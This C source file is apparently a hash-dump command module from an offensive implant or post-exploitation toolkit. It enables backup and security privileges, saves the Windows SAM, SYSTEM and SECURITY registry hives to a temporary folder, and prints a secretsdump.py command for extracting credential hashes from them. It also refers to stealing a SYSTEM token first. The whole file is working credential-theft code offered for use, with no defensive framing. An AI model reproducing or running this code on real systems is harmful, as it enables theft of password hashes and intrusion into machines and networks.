#include "commands.h"
#include "adv_lazy.h"
#include <windows.h>
#include <stdio.h>
#include <string.h>

static int _save_hive(HKEY root, const char *subkey,
                      const char *out_path,
                      char *msg, size_t msgsz)
{
    /* remove existing file first (RegSaveKeyA fails if it exists) */
    DeleteFileA(out_path);

    HKEY hk = NULL;
    LONG rc = RegOpenKeyExA(root, subkey, 0, KEY_READ, &hk);
    if (rc != ERROR_SUCCESS) {
        snprintf(msg, msgsz, "[hd] RegOpenKeyEx(%s) failed: %ld\n",
                 subkey, rc);
        return -1;
    }

    rc = RegSaveKeyA(hk, out_path, NULL);
    RegCloseKey(hk);

    if (rc != ERROR_SUCCESS) {
        snprintf(msg, msgsz, "[hd] RegSaveKey(%s) failed: %ld\n",
                 subkey, rc);
        return -1;
    }

    LARGE_INTEGER sz = {0};
    HANDLE hf = CreateFileA(out_path, GENERIC_READ, FILE_SHARE_READ,
                             NULL, OPEN_EXISTING, 0, NULL);
    if (hf != INVALID_HANDLE_VALUE) {
        GetFileSizeEx(hf, &sz);
        CloseHandle(hf);
    }

    snprintf(msg, msgsz, "  %-10s → %s  (%llu bytes)\n",
             subkey, out_path, (unsigned long long)sz.QuadPart);
    return 0;
}

int cmd_hashdump(const char *dir, char *output_buf, size_t output_size)
{
    char out_dir[MAX_PATH];
    if (dir && dir[0]) {
        strncpy(out_dir, dir, sizeof(out_dir) - 1);
        out_dir[sizeof(out_dir) - 1] = '\0';
    } else {
        GetTempPathA(sizeof(out_dir), out_dir);
    }
    /* strip trailing backslash */
    size_t dlen = strlen(out_dir);
    if (dlen > 0 && out_dir[dlen - 1] == '\\')
        out_dir[--dlen] = '\0';

    /* SeBackupPrivilege LUID={17,0}, SeSecurityPrivilege LUID={8,0} — constant on all NT */
    {
        const adv_api_t *_a = adv_get();
        HANDLE _tok = NULL;
        if (_a->OpenProcessToken && _a->AdjustTokenPrivileges &&
            _a->OpenProcessToken(GetCurrentProcess(),
                                 TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &_tok)) {
            TOKEN_PRIVILEGES _tp;
            _tp.PrivilegeCount = 1;
            _tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            _tp.Privileges[0].Luid.LowPart = 17; _tp.Privileges[0].Luid.HighPart = 0;
            _a->AdjustTokenPrivileges(_tok, FALSE, &_tp, 0, NULL, NULL);
            _tp.Privileges[0].Luid.LowPart = 8;
            _a->AdjustTokenPrivileges(_tok, FALSE, &_tp, 0, NULL, NULL);
            CloseHandle(_tok);
        }
    }

    char sam_path[MAX_PATH], sys_path[MAX_PATH], sec_path[MAX_PATH];
    snprintf(sam_path, sizeof(sam_path), "%s\\sam.hive",      out_dir);
    snprintf(sys_path, sizeof(sys_path), "%s\\system.hive",   out_dir);
    snprintf(sec_path, sizeof(sec_path), "%s\\security.hive", out_dir);

    size_t pos = 0;
    int n = snprintf(output_buf + pos, output_size - pos,
                     "[hd] saving hives to %s\n", out_dir);
    if (n > 0) pos += (size_t)n;

    static const struct { HKEY root; const char *key; } hives[] = {
        {HKEY_LOCAL_MACHINE, "SAM"},
        {HKEY_LOCAL_MACHINE, "SYSTEM"},
        {HKEY_LOCAL_MACHINE, "SECURITY"},
    };
    static const char *paths[] = {NULL, NULL, NULL};
    /* assign at runtime */
    char *ppaths[3];
    ppaths[0] = sam_path;
    ppaths[1] = sys_path;
    ppaths[2] = sec_path;

    int any_ok = 0;
    for (int i = 0; i < 3; i++) {
        char msg[512];
        int rc = _save_hive(hives[i].root, hives[i].key, ppaths[i],
                             msg, sizeof(msg));
        n = snprintf(output_buf + pos, output_size - pos, "%s", msg);
        if (n > 0) pos += (size_t)n;
        if (rc == 0) any_ok++;
    }

    if (any_ok == 0) {
        n = snprintf(output_buf + pos, output_size - pos,
                     "[hd] all failed - try st on a SYSTEM process first\n");
        if (n > 0) pos += (size_t)n;
        return -1;
    }

    n = snprintf(output_buf + pos, output_size - pos,
                 "[hd] extract creds:\n"
                 "  secretsdump.py -sam sam.hive -system system.hive -security security.hive LOCAL\n");
    if (n > 0) pos += (size_t)n;

    (void)paths;
    return 0;
}
